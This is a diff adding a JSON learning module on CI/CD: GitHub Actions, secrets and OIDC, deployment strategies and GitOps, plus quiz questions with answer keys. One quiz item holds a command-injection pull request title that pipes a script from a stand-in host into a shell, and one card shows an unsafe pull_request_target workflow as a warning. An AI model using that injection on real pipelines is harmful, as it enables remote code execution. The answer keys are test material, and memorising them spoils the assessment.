@@ -1,0 +1,686 @@
+{
+  "id": "cicd",
+  "code": "O3",
+  "track": "delivery",
+  "title": "CI/CD",
+  "blurb": "Every change is automatically built, tested, and deployed with confidence and reversibility.",
+  "mustKnow": [
+    {
+      "tier": "must",
+      "title": "CI, continuous delivery, and continuous deployment",
+      "body": "Continuous integration (CI) means developers merge changes into the main branch frequently—at least daily—and automatically build and test each change so problems are caught early. Continuous delivery keeps the main branch deployable, but a person still approves production releases. Continuous deployment removes that manual approval: every change that passes the pipeline goes to production. Merely having a CI server is not enough if the team still works on branches that stay separate for weeks."
+    },
+    {
+      "tier": "must",
+      "title": "Pipeline stages and failing fast",
+      "body": "A typical pipeline runs linting and compilation, unit tests and security scans, builds an artifact, runs integration or end-to-end tests, then deploys to staging and production. Put fast checks that catch common problems early, and stop the pipeline as soon as a step fails. Developers can get feedback in minutes instead of waiting for a long end-to-end suite to catch a typo. Independent checks such as linting and unit tests can run in parallel, but deployment must wait until all required checks pass."
+    },
+    {
+      "tier": "must",
+      "title": "GitHub Actions: events, jobs, steps, and runners",
+      "body": "A GitHub Actions workflow is a YAML file in .github/workflows/. Its on section lists events that trigger it, such as push, pull_request, schedule, or workflow_dispatch. Each job runs on its own runner (runs-on), and jobs run in parallel by default. Use needs when one job must wait for another. A job's steps run in order on the same runner and can be shell commands (run) or reusable actions (uses). Specify action versions, and for stronger supply-chain security pin third-party actions to a commit SHA.",
+      "code": "on: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: npm ci && npm test\n  build:\n    needs: test        # รอ test ผ่านก่อน\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: npm ci && npm run build"
+    },
+    {
+      "tier": "must",
+      "title": "Secrets and OIDC",
+      "body": "Repository or environment secrets are masked in GitHub Actions logs, but transformed values (for example, a base64-encoded secret) can still leak. Do not print secrets. Workflows triggered by pull_request from a fork do not receive repository secrets; the automatically provided GITHUB_TOKEN is read-only. Give GITHUB_TOKEN only the permissions each job needs. For cloud access, prefer OIDC: the workflow requests a short-lived token from GitHub and exchanges it for temporary cloud credentials, avoiding long-lived access keys. Configure a cloud trust policy to restrict which repositories and branches may assume the role.",
+      "code": "permissions:\n  id-token: write   # ให้ขอ OIDC token ได้\n  contents: read\nsteps:\n  - uses: aws-actions/configure-aws-credentials@v6\n    with:\n      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy\n      aws-region: ap-southeast-1"
+    },
+    {
+      "tier": "must",
+      "title": "Build once, deploy the same artifact everywhere",
+      "body": "Build an artifact, such as a container image, once for each commit, tag it immutably (for example, with the commit SHA), and promote the same artifact through development, staging, and production. Configure environment differences with settings or environment variables instead of rebuilding. Separate builds can pick up different dependency or base-image versions, so a staging test no longer guarantees that production will run the same artifact. Avoid the movable :latest tag for promotion."
+    },
+    {
+      "tier": "must",
+      "title": "Every deployment needs a rollback plan",
+      "body": "Before a deployment, know how to restore the previous version and how long the rollback will take. The quickest option is usually to redeploy the previous artifact; building once makes this straightforward. Database migrations require extra care: if a release renames or removes a column, rolling back to old code may fail. Use expand-and-contract: add the new schema while both code versions still work, migrate usage, and remove the old schema in a later release."
+    },
+    {
+      "tier": "should",
+      "title": "Fast caches and feedback",
+      "body": "Slow pipelines discourage frequent integration and encourage large batches of changes, which works against CI. Aim to finish a pull-request pipeline in about 10 minutes or less. Cache dependencies using a key tied to the lockfile (setup-node can do this with cache: npm), run independent jobs in parallel, and split large test suites into shards. Do not speed things up by deleting tests or caching node_modules with a key unrelated to the lockfile: that can silently reuse stale dependencies. setup-node's npm cache stores downloaded packages; npm ci still installs from the lockfile."
+    },
+    {
+      "tier": "should",
+      "title": "Deployment strategies: rolling, blue-green, and canary",
+      "body": "A rolling deployment replaces instances gradually and uses fewer extra resources, but old and new versions run at the same time during the rollout. Blue-green keeps a complete new environment beside the old one and switches traffic at once; rollback is fast, but capacity may temporarily double. A canary sends a small share of traffic (for example, 5%) to the new version, compares its metrics with the old version, then expands or rolls back. Canary limits impact, but requires enough observability to make that decision."
+    },
+    {
+      "tier": "should",
+      "title": "Feature flags",
+      "body": "Feature flags separate deploying code from releasing a feature to users. Merge unfinished work while its flag is off, then enable it for user groups as it becomes ready. A flag can also act as a kill switch, disabling a problematic feature without another deployment. Flags that are never removed create technical debt and untested code paths, so set a removal date when adding each temporary flag."
+    },
+    {
+      "tier": "should",
+      "title": "Observability after deployment",
+      "body": "A green pipeline does not prove that the deployed system is healthy. Compare metrics (error rate, latency, and saturation), logs, and traces with their pre-deployment baselines. Include the release version or commit SHA in telemetry and mark deployment times on dashboards so problems can be tied to a release. Alert on symptoms users experience, such as API errors, and use these metrics to guide automated canary expansion or rollback."
+    },
+    {
+      "tier": "advanced",
+      "title": "Infrastructure as Code",
+      "body": "Define infrastructure—such as networks, databases, and IAM—in code with tools such as Terraform, OpenTofu, Pulumi, or CloudFormation. Store changes in Git, review them like application code, and apply them through pipelines so environments can be recreated and changes tracked. Show the plan in the pull request before applying it. Manual console edits create drift between the real environment and the code; a later apply may overwrite those edits.",
+      "code": "terraform fmt -check\nterraform validate\nterraform plan -out=tfplan   # แสดงผลใน PR ให้ review\nterraform apply tfplan       # หลัง merge เท่านั้น"
+    },
+    {
+      "tier": "advanced",
+      "title": "DORA metrics",
+      "body": "DORA measures software delivery with five metrics. Throughput metrics are change lead time (commit to production), deployment frequency, and failed-deployment recovery time. Instability metrics are change fail rate and deployment rework rate; rework rate was added in 2024, and recovery time replaced MTTR in 2023. DORA research finds that speed and stability can improve together. Use the metrics to identify team trends and improvement opportunities, not to rank individuals or teams."
+    },
+    {
+      "tier": "must",
+      "title": "Matrix strategy: test multiple combinations in one job",
+      "body": "strategy.matrix creates a separate job for each combination of values—for example, Node 22 and 24 on Ubuntu and Windows—without duplicating the job definition. Use matrix.include to add values or combinations and matrix.exclude to omit combinations; include is processed after exclude. By default, fail-fast is true: one failing matrix job cancels other running and queued jobs, so you may not see every result. Set fail-fast: false when you need all combinations to finish. A workflow run can create at most 256 matrix jobs.",
+      "code": "test:\n  runs-on: ${{ matrix.os }}\n  strategy:\n    fail-fast: false\n    matrix:\n      os: [ubuntu-latest, windows-latest]\n      node: [22, 24]\n      exclude:\n        - os: windows-latest\n          node: 22\n  steps:\n    - uses: actions/setup-node@v7\n      with:\n        node-version: ${{ matrix.node }}",
+      "exam": true,
+      "ref": "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstrategymatrix"
+    },
+    {
+      "tier": "must",
+      "title": "Job outputs: pass values between jobs",
+      "body": "Each job gets its own runner, so values created in one job are not automatically available in another. To pass a short text value such as a version, have a step with an id write name=value to the file named by $GITHUB_OUTPUT, map that step output to a job-level output, and read it through needs.<job>.outputs.<name>. Job outputs are limited to 1 MB per job. Declaring only a step output is not enough. In a matrix, jobs that write the same output name can overwrite one another, and completion order is not guaranteed.",
+      "code": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      version: ${{ steps.ver.outputs.version }}\n    steps:\n      - id: ver\n        run: echo \"version=${GITHUB_SHA::7}\" >> \"$GITHUB_OUTPUT\"\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          VERSION: ${{ needs.build.outputs.version }}\n        run: echo \"deploying $VERSION\"",
+      "ref": "https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idoutputs"
+    },
+    {
+      "tier": "must",
+      "title": "Environments and deployment protection rules",
+      "body": "An environment names a deployment target, such as staging or production, and attaches protection rules and secrets to it. A job that declares environment: production must pass that environment's rules before it starts or can access its secrets. Rules can require reviewers (up to six people or teams, with one approval required), enable prevent self-review, set a wait timer, or restrict deployment branches and tags. Use separate environment secrets for production and staging. Some protection rules in private repositories require a supported GitHub plan.",
+      "code": "deploy:\n  needs: build\n  runs-on: ubuntu-latest\n  environment: production   # job นี้รอ reviewer อนุมัติก่อนเริ่ม\n  steps:\n    - run: ./deploy.sh\n      env:\n        DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}   # environment secret",
+      "exam": true,
+      "ref": "https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments"
+    },
+    {
+      "tier": "must",
+      "title": "Script injection: do not interpolate expressions into run",
+      "body": "GitHub replaces expressions such as ${{ ... }} in a run script before the shell executes it. If an expression contains untrusted text—such as a pull request title, branch name, or comment—an attacker may close a quote and inject shell commands. Put the value in the step's env block and reference it as a quoted shell variable, such as \"$TITLE\". This keeps the value as data instead of inserting it into the script. Changing quote styles alone is not a defense because input may close those quotes too.",
+      "code": "# ไม่ปลอดภัย: ชื่อ PR กลายเป็นส่วนหนึ่งของสคริปต์\n- run: echo \"${{ github.event.pull_request.title }}\"\n\n# ปลอดภัยกว่า: ส่งผ่าน env แล้วอ้างเป็นตัวแปร\n- env:\n    TITLE: ${{ github.event.pull_request.title }}\n  run: echo \"$TITLE\"",
+      "exam": true,
+      "ref": "https://docs.github.com/en/actions/reference/security/secure-use#use-an-intermediate-environment-variable"
+    },
+    {
+      "tier": "must",
+      "title": "Branch protection and required status checks",
+      "body": "CI is only a suggestion until branch rules require checks to pass before changes can merge. Protect main with required status checks. GitHub considers successful, skipped, and neutral checks successful. Give required job names unique names across workflows; duplicate names can cause checks to be confused or block a pull request. Branch rules do not apply to repository administrators by default, so enable the administrator restriction if they must not bypass CI.",
+      "ref": "https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-protected-branches/about-protected-branches"
+    },
+    {
+      "tier": "should",
+      "title": "Artifacts and caches serve different purposes",
+      "body": "Artifacts are files produced by a job, such as binaries, test reports, or coverage results. Keep them for later inspection or pass them to another job with actions/upload-artifact and actions/download-artifact. Caches hold reusable files, such as downloaded dependencies, to speed up later runs. Do not use a cache as a required handoff: the job must still work if the cache is missing. For example, dist/ produced by a build and needed by a deploy job must be uploaded as an artifact, not stored as a cache.",
+      "code": "# job build\n- uses: actions/upload-artifact@v7\n  with:\n    name: dist\n    path: dist/\n\n# job deploy (needs: build)\n- uses: actions/download-artifact@v8\n  with:\n    name: dist\n    path: dist/",
+      "ref": "https://docs.github.com/en/actions/concepts/workflows-and-actions/workflow-artifacts"
+    },
+    {
+      "tier": "should",
+      "title": "Concurrency: avoid overlapping or canceled deployments",
+      "body": "concurrency.group allows only one running job or workflow in a group. By default, a new run becomes pending; if another run is already pending in that group, the newer one replaces it. Set cancel-in-progress: true to cancel the currently running job too. This is useful for pull-request CI, where an older commit's result is no longer useful. Use github.workflow and github.ref in the group to separate workflows and branches. Do not cancel a production deployment mid-run: use a fixed group such as deploy-production and cancel-in-progress: false so deployments queue together.",
+      "code": "# CI ของ PR: ยกเลิกรอบเก่าของ branch เดียวกัน\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true\n\n# deploy production (อีก workflow): ต่อคิว ไม่ฆ่ารอบที่รันอยู่\nconcurrency:\n  group: deploy-production\n  cancel-in-progress: false",
+      "ref": "https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency"
+    },
+    {
+      "tier": "should",
+      "title": "Reusable workflows: workflow_call and passing secrets",
+      "body": "A workflow declared with on: workflow_call can be invoked by another workflow using uses at the job level, which is useful for sharing standard pipelines across repositories. Pass declared inputs and explicitly pass secrets by name, or use secrets: inherit when the caller and reusable workflow are in the same organization or enterprise. Secrets are passed only to directly called workflows; they are not automatically forwarded to nested workflows. The called workflow's GITHUB_TOKEN permissions can stay the same or become more restrictive, but not broader.",
+      "code": "# .github/workflows/ci-node.yml (reusable)\non:\n  workflow_call:\n    inputs:\n      node-version:\n        type: string\n        default: '24'\n\n# workflow ที่เรียกใช้\njobs:\n  ci:\n    uses: my-org/shared/.github/workflows/ci-node.yml@v1\n    with:\n      node-version: '22'\n    secrets: inherit",
+      "ref": "https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows"
+    },
+    {
+      "tier": "should",
+      "title": "GitLab CI: stages, needs, and rules",
+      "body": "Without a custom stage list, GitLab uses .pre, build, test, deploy, and .post. Declare stages in the stages list. Jobs in the same stage run in parallel, and the next stage waits for the previous stage to finish. needs creates a DAG that can bypass stage order; for example, needs: [] starts a job immediately. GitLab evaluates rules in order when creating a pipeline and stops at the first match. If no rule matches, the job is not added to the pipeline; it is not merely skipped.",
+      "code": "stages: [test, build, deploy]\n\nlint:\n  stage: test\n  needs: []          # เริ่มทันที ไม่รอ stage ก่อนหน้า\n  script: npm run lint\n\ndeploy:\n  stage: deploy\n  script: ./deploy.sh\n  rules:\n    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH",
+      "exam": true,
+      "ref": "https://docs.gitlab.com/ci/yaml/#stages"
+    },
+    {
+      "tier": "advanced",
+      "title": "pull_request_target and workflow_run: high-privilege triggers",
+      "body": "pull_request_target and workflow_run execute in the context of the target repository's default branch, not the pull request's merge commit. This allows trusted tasks such as labeling a fork's pull request. GitHub warns against using these triggers to build or run pull request code: untrusted code can gain access to secrets or write permissions, or poison caches (a “pwn request”). workflow_run carries similar risks if it checks out untrusted code. In this repository's current setup, actions/checkout@v7 refuses fork pull-request checkout for these triggers unless allow-unsafe-pr-checkout: true is explicitly enabled after a risk assessment. For building and testing untrusted pull request code, use pull_request, which does not receive repository secrets; its GITHUB_TOKEN is read-only.",
+      "code": "# อันตราย: รันโค้ดของ PR ในบริบทที่มีสิทธิ์สูง\n# (checkout v7 จะปฏิเสธ fork PR ถ้าไม่ตั้ง allow-unsafe-pr-checkout)\non: pull_request_target\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n          allow-unsafe-pr-checkout: true\n      - run: npm ci && npm test",
+      "ref": "https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request_target"
+    },
+    {
+      "tier": "advanced",
+      "title": "GitOps: agents reconcile the desired state",
+      "body": "OpenGitOps v1.0.0 defines four principles: the system has a declarative desired state; that state is stored in a versioned, immutable store with a complete history (such as Git); software agents automatically pull the desired state; and agents continuously observe actual state and reconcile it toward the desired state. This differs from push-based CD, where a pipeline commands each apply. With Git as the source of truth, changes should begin with a commit or pull request. A reconciliation agent may undo manual edits (drift) to restore the declared state. Details such as reconciliation intervals and self-healing depend on the tool and its configuration.",
+      "ref": "https://opengitops.dev/"
+    },
+    {
+      "tier": "advanced",
+      "title": "Kubernetes RollingUpdate: maxSurge, maxUnavailable, and readiness",
+      "body": "A Deployment RollingUpdate gradually scales down the old ReplicaSet and scales up the new one. maxUnavailable (default 25%, rounded down) sets how many Pods may be unavailable during the update; maxSurge (default 25%, rounded up) sets how many extra Pods may be created above the desired count. They cannot both be zero. To keep the available capacity from dropping, use maxUnavailable: 0 and maxSurge of at least 1. Add a readiness probe: Pods that have not passed readiness receive no Service traffic, and the rollout waits for new Pods to become ready before reducing the old ReplicaSet. If needed, kubectl rollout undo can return to the prior revision while its ReplicaSet remains; revisionHistoryLimit defaults to 10.",
+      "code": "spec:\n  replicas: 4\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxUnavailable: 0\n      maxSurge: 1\n  template:\n    spec:\n      containers:\n        - name: api\n          image: registry.example.com/api:3f9a1c2\n          readinessProbe:\n            httpGet:\n              path: /healthz\n              port: 8080",
+      "exam": true,
+      "ref": "https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#rolling-update-deployment"
+    }
+  ],
+  "questions": [
+    {
+      "prompt": "A team runs tests and builds an image after every merge to main, automatically deploys to staging, and has a release manager approve production once a day. Which delivery practices does this describe?",
+      "options": [
+        "Continuous deployment, because every deployment step is automated.",
+        "CI only, because a person is still involved before production.",
+        "Continuous delivery, because every change is kept ready to release but a person makes the final production decision.",
+        "Continuous deployment, because staging is deployed automatically."
+      ],
+      "answer": 2,
+      "explain": "Continuous delivery keeps each change ready for production but leaves the production release to a person. Continuous deployment automatically releases every change that passes the pipeline. Automatically deploying to staging alone is not continuous deployment."
+    },
+    {
+      "prompt": "The pipeline runs E2E tests (25 minutes), then unit tests (3 minutes), then lint (30 seconds). Developers wait nearly half an hour to learn that they missed a space. What should the team change first?",
+      "options": [
+        "Move lint and unit tests up first, and have the pipeline stop immediately when any step fails.",
+        "Move E2E to run only at night to shorten the PR pipeline.",
+        "Switch to a stronger runner to allow E2E to end several minutes earlier.",
+        "Combine all three steps into one step so you don't waste time starting a new job."
+      ],
+      "answer": 0,
+      "explain": "Run the fastest checks that catch common problems first, and stop as soon as one fails. Linting and unit tests can catch simple mistakes in minutes; a 25-minute E2E suite should not delay that feedback. Moving E2E to nightly runs would let a broken change reach main before the next run."
+    },
+    {
+      "prompt": "Production receives code that failed tests even though the test job is red. What is the likely cause in the workflow?",
+      "code": "on:\n  push:\n    branches: [main]\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: npm ci && npm test\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n      - run: ./deploy.sh",
+      "options": [
+        "The YAML job order is correct; npm test returns exit code 0 despite failing.",
+        "The jobs share runs-on, so they compete and hide the test result.",
+        "Add if: success() to every deploy step to read the test job result.",
+        "Jobs run in parallel by default; add needs: test to deploy so it waits for tests to pass."
+      ],
+      "answer": 3,
+      "explain": "GitHub Actions jobs run in parallel by default, regardless of their order in the YAML file. Add needs: test to the deploy job so it waits for the test job and is skipped if the test fails. success() in a step checks earlier steps in the same job, not another job's result."
+    },
+    {
+      "prompt": "The team replaces long-lived AWS access keys stored in secrets with the OIDC setup shown. What is the main benefit?",
+      "code": "permissions:\n  id-token: write\n  contents: read\nsteps:\n  - uses: aws-actions/configure-aws-credentials@v6\n    with:\n      role-to-assume: arn:aws:iam::123456789012:role/gha-deploy\n      aws-region: ap-southeast-1",
+      "options": [
+        "The key is still stored as a secret, but GitHub encrypts it more strongly.",
+        "No long-lived keys to leak; workflows receive temporary credentials restricted by the AWS trust policy.",
+        "No AWS configuration is needed because GitHub grants all permissions automatically.",
+        "Fork pull requests can deploy immediately without maintainer approval."
+      ],
+      "answer": 1,
+      "explain": "OIDC lets the workflow exchange a short-lived GitHub token for temporary credentials for an AWS role, avoiding long-lived access keys. AWS still needs a trust policy restricting which repositories or branches can assume the role. The advantage is not stronger encryption of a permanent key."
+    },
+    {
+      "prompt": "The staging and production jobs each build the Dockerfile with FROM node:24. A bug appears only in production, even though staging passed. What is the most likely cause and fix?",
+      "options": [
+        "Staging has less traffic, so add load testing before production.",
+        "Use the same :latest tag in both environments so the images always match.",
+        "Separate builds can use different base-image versions; build once and promote the same artifact.",
+        "Always build production with --no-cache to get the newest dependencies."
+      ],
+      "answer": 2,
+      "explain": "A mutable base-image tag such as node:24 can point to different image versions at different times. Separate builds for staging and production can therefore contain different base images. Build once, identify the artifact by commit SHA or digest, and promote that same artifact to each environment."
+    },
+    {
+      "prompt": "During a canary at 5% traffic, the new version has a 4% error rate while the old version has 0.5%; latency is otherwise normal. What should the team do?",
+      "options": [
+        "Expand traffic to 50% first to gather more data.",
+        "Stop the rollout, return traffic to the stable version, and investigate.",
+        "Continue because only 5% of users are affected and latency is normal.",
+        "Skip review and tests, then hotfix the canary immediately."
+      ],
+      "answer": 1,
+      "explain": "A canary compares the new version's metrics with the existing version while limiting exposure. An error rate of 4% versus 0.5% is a clear regression, so stop the rollout and send traffic back to the stable version while investigating. Expanding traffic would expose more users to the problem."
+    },
+    {
+      "prompt": "A release renames users.name to full_name. The team uses blue-green deployment and plans to switch back to blue within a minute if anything goes wrong. What risk does this plan have?",
+      "options": [
+        "There is no risk; blue and green use separate databases automatically.",
+        "Blue-green is too slow; switch to rolling deployment for a faster rollback.",
+        "Restore the database from backup every time traffic is switched back.",
+        "The blue version still reads name, which no longer exists; use an expand-and-contract migration."
+      ],
+      "answer": 3,
+      "explain": "Blue and green usually share a database. Renaming a column can make the old blue code fail as soon as traffic is switched back. Use an expand-and-contract migration: add the new column, support both versions while migrating, then remove the old column in a later release. A rolling deployment has the same compatibility issue while both versions run."
+    },
+    {
+      "prompt": "A paid feature has taken three weeks to build on a long-lived branch, and rebasing causes repeated conflicts. Which approach best follows CI principles?",
+      "options": [
+        "Merge small changes into main frequently behind a disabled feature flag.",
+        "Keep the long-lived branch until the feature is finished, then squash-merge it.",
+        "Create a separate repository so the feature cannot affect the main pipeline.",
+        "Stop merging other changes to main until the feature is complete."
+      ],
+      "answer": 0,
+      "explain": "A feature flag lets unfinished code be merged into main while the feature remains hidden from users. Frequent integration reduces long-lived branches and merge conflicts. Squashing at the end does not remove the integration risk of a three-week branch."
+    },
+    {
+      "prompt": "An engineer adds an AWS security-group rule manually in the console, although Terraform manages the infrastructure. A week later another PR runs terraform apply. What should the team expect and do?",
+      "options": [
+        "Nothing; Terraform automatically imports console changes into code.",
+        "terraform apply always fails after a console edit, so delete and recreate the security group.",
+        "The manual rule may be removed; add it to code in a PR and review the plan.",
+        "It is safe because Terraform changes only resources touched by the current PR."
+      ],
+      "answer": 2,
+      "explain": "Terraform compares the real infrastructure with the declared configuration and may remove a console change during a later apply. Add the manual fix to code, review the plan, and then apply it so infrastructure changes remain tracked and reproducible."
+    },
+    {
+      "prompt": "The team deploys 20 times per day, but about one-third of deployments are followed by unplanned hotfixes. What is the best summary using DORA metrics?",
+      "options": [
+        "The team is excellent because deployment frequency is the most important metric.",
+        "Throughput is high, but change fail rate and rework rate show instability.",
+        "Reduce deployment frequency to once a week so each release is more stable.",
+        "DORA measures only speed; use different metrics for stability."
+      ],
+      "answer": 1,
+      "explain": "DORA uses throughput and instability metrics together. Frequent deployments alongside many unplanned hotfixes indicate high change fail rate and rework rate. The goal is to improve both speed and stability, not simply reduce deployment frequency."
+    },
+    {
+      "prompt": "A matrix tests Node 22 and 24 on Ubuntu and Windows. One Windows/Node 22 job fails, and the remaining jobs are canceled. How can the team see every result?",
+      "code": "strategy:\n  matrix:\n    os: [ubuntu-latest, windows-latest]\n    node: [22, 24]",
+      "options": [
+        "Add needs between matrix jobs so none are canceled.",
+        "Reduce the matrix to two combinations so no job fails.",
+        "Set strategy.fail-fast: false; it defaults to true and cancels other jobs after a failure.",
+        "Use self-hosted runners because GitHub-hosted runners always cancel other jobs."
+      ],
+      "answer": 2,
+      "explain": "By default, fail-fast cancels running and queued matrix jobs after one fails. Set strategy.fail-fast: false when you want results from every combination, even if some jobs fail. needs controls dependencies between jobs, not matrix cancellation."
+    },
+    {
+      "prompt": "A workflow prints “deploying ” without a version, even though a build step wrote that value to $GITHUB_OUTPUT. What is missing?",
+      "code": "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - id: ver\n        run: echo \"version=1.4.2\" >> \"$GITHUB_OUTPUT\"\n  deploy:\n    needs: build\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"deploying ${{ needs.build.outputs.version }}\"",
+      "options": [
+        "The build job has not mapped the step output to a job-level output.",
+        "Write the value to $GITHUB_ENV instead; $GITHUB_OUTPUT works only within one step.",
+        "needs.<job>.outputs can read only jobs adjacent to each other in the YAML file.",
+        "Outputs cannot cross runners; always use artifacts, even for short text values."
+      ],
+      "answer": 0,
+      "explain": "A step output is available only within its job until the job maps it to a job-level output. Declare outputs on build, for example version: ${{ steps.ver.outputs.version }}, then read it from the dependent job as needs.build.outputs.version. Use artifacts for files, not short text values."
+    },
+    {
+      "prompt": "The build job creates dist/, but the deploy job runs on another runner and cannot find it. How should the workflow pass the files?",
+      "options": [
+        "Use actions/cache with a lockfile key to share dist/ with deploy.",
+        "Add needs: build again to the deploy step so it can see the files.",
+        "Pass each file through job outputs as a separate text value.",
+        "Upload dist/ as an artifact in build, then download it in deploy."
+      ],
+      "answer": 3,
+      "explain": "Artifacts are the supported way to pass files such as dist/ between jobs that run on separate runners. Upload the directory in build and download it in deploy. A cache is only an optimization and may be missing; needs controls job order but does not share a runner's filesystem."
+    },
+    {
+      "prompt": "A production environment has one required reviewer and a DEPLOY_TOKEN secret. What happens when a job targeting that environment is triggered?",
+      "options": [
+        "The job runs immediately, but DEPLOY_TOKEN is blank until approval.",
+        "The job waits for reviewer approval before starting and cannot access DEPLOY_TOKEN until approved.",
+        "Only the step using DEPLOY_TOKEN pauses for approval.",
+        "The whole workflow pauses, including build jobs that do not use the environment."
+      ],
+      "answer": 1,
+      "explain": "A job that targets an environment waits for that environment's protection rules before it starts and before it can access its secrets. The approval gates that job, not unrelated jobs in the workflow, and does not pause only the secret-using step."
+    },
+    {
+      "prompt": "The organization requires production deployments to be approved by someone other than the person who initiated them, even when that person is on the reviewer list. Which environment setting enforces this?",
+      "options": [
+        "Set a long wait timer so the initiator has no time to approve.",
+        "Restrict deployment branches to protected branches.",
+        "Enable prevent self-review so the initiator cannot approve their own deployment.",
+        "Require six reviewers because all of them must approve."
+      ],
+      "answer": 2,
+      "explain": "Prevent self-review stops the person who initiated a deployment from approving it, even if they are listed as a reviewer. A wait timer and branch restrictions do not enforce independent approval. Only one required reviewer needs to approve, so adding more reviewers does not solve self-approval."
+    },
+    {
+      "prompt": "A pull request title is `x\"; curl https://evil.example/s.sh | sh; echo \"`. The title-check workflow interpolates it into run. What is the risk, and how should the value be passed?",
+      "code": "on: pull_request\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"Title: ${{ github.event.pull_request.title }}\"",
+      "options": [
+        "GitHub escapes the input automatically, so no fix is needed.",
+        "Forks receive no secrets, so command injection cannot cause harm.",
+        "Change the trigger to pull_request_target to run in the trusted repository context.",
+        "The title is inserted into the script before execution; pass it through env and use a quoted \"$TITLE\" variable."
+      ],
+      "answer": 3,
+      "explain": "Expressions inserted directly into run are expanded before the shell runs, so an attacker-controlled pull request title can inject shell commands. Pass the value through the step's env block and quote the variable, such as \"$TITLE\". A fork's limited secrets reduce exposure but do not prevent command execution; pull_request_target would increase the permissions at risk."
+    },
+    {
+      "prompt": "On a push to main, deploy is skipped because lint runs only on pull requests and deploy lists both lint and test in needs. How should the workflow let deploy run when lint is skipped but still require tests to pass?",
+      "code": "jobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm test\n  lint:\n    if: github.event_name == 'pull_request'\n    runs-on: ubuntu-latest\n    steps:\n      - run: npm run lint\n  deploy:\n    needs: [test, lint]\n    runs-on: ubuntu-latest\n    steps:\n      - run: ./deploy.sh",
+      "options": [
+        "Remove test from needs and run the test after deployment.",
+        "Set continue-on-error: true so deploy ignores every failed or skipped dependency.",
+        "Use if: ${{ !failure() && !cancelled() }} so deploy can proceed when lint is skipped but still stops on failure.",
+        "Do nothing; skipped jobs always count as passed, so deploy should already run."
+      ],
+      "answer": 2,
+      "explain": "A skipped job that is listed in needs can cause dependent jobs to be skipped too. Add a job-level status condition such as if: ${{ !failure() && !cancelled() }} so deploy can proceed when lint is skipped, while still stopping if a required test fails. continue-on-error changes failure handling; it does not override dependency skipping by itself."
+    },
+    {
+      "prompt": "A pull request changes only README.md. The required test check stays pending because its workflow uses paths: [src/**]. Why can the PR not merge?",
+      "options": [
+        "GitHub requires repository admins to bypass the check when a PR does not change src/.",
+        "The path filter skipped the workflow, so the required check was never reported and remains pending.",
+        "Required checks must be strict before a docs-only PR can merge.",
+        "A skipped check never satisfies branch protection, so every job must always run."
+      ],
+      "answer": 1,
+      "explain": "A workflow skipped by a paths filter may leave a required status check pending, blocking the pull request. Run the workflow for every pull request and use an if condition to skip the irrelevant job; skipped jobs are treated as successful for required checks. Do not make all jobs run when they are unnecessary."
+    },
+    {
+      "prompt": "A production deployment is canceled midway through a database migration when a second push starts. The workflow uses cancel-in-progress: true. What should change?",
+      "code": "concurrency:\n  group: production\n  cancel-in-progress: true",
+      "options": [
+        "Remove concurrency so both deployments run at once.",
+        "Include github.sha in the group so every commit deploys concurrently.",
+        "Increase timeout-minutes because the job was canceled by its timeout.",
+        "Remove cancel-in-progress: true so the new deployment waits instead of canceling the running one."
+      ],
+      "answer": 3,
+      "explain": "cancel-in-progress: true cancels the running job in the concurrency group. Remove it for production deployments so a newer run waits instead of interrupting a migration. A group per commit would allow deployments to overlap, which is also unsafe."
+    },
+    {
+      "prompt": "Pushing one pull request cancels CI for an unrelated pull request. What is the likely concurrency configuration problem?",
+      "code": "concurrency:\n  group: ci\n  cancel-in-progress: true",
+      "options": [
+        "Every PR uses the same fixed group name, such as ci; include github.workflow and github.ref in the group.",
+        "Set cancel-in-progress: false because true works only for pushes to main.",
+        "Workflow-level concurrency does not support pull_request; move it to a step.",
+        "GitHub permits only one workflow run per repository, and this cannot be changed."
+      ],
+      "answer": 0,
+      "explain": "The fixed concurrency group ci puts every pull request in the same group, so one run cancels another. Include github.workflow and github.ref in the group to separate workflows and branches. Setting cancel-in-progress to false only queues runs; it does not give each PR its own group."
+    },
+    {
+      "prompt": "A reusable publish.yml workflow reads secrets.NPM_TOKEN, but the calling workflow does not pass that secret. How should the team fix it?",
+      "code": "jobs:\n  publish:\n    uses: my-org/shared/.github/workflows/publish.yml@v1\n    with:\n      package: web",
+      "options": [
+        "Store NPM_TOKEN as a secret in every repository that owns the reusable workflow.",
+        "The caller must pass the secret by name or use secrets: inherit.",
+        "Set permissions: write-all so the reusable workflow can read the secret.",
+        "Caller secrets are forwarded automatically; the secret name must be wrong."
+      ],
+      "answer": 1,
+      "explain": "The caller must explicitly pass secrets to a reusable workflow, either by name or with secrets: inherit. Secrets are not forwarded automatically. GITHUB_TOKEN permissions are configured separately and do not pass NPM_TOKEN."
+    },
+    {
+      "prompt": "To expose a secret to external pull requests, a team switches to pull_request_target and checks out the PR code. What is the main risk?",
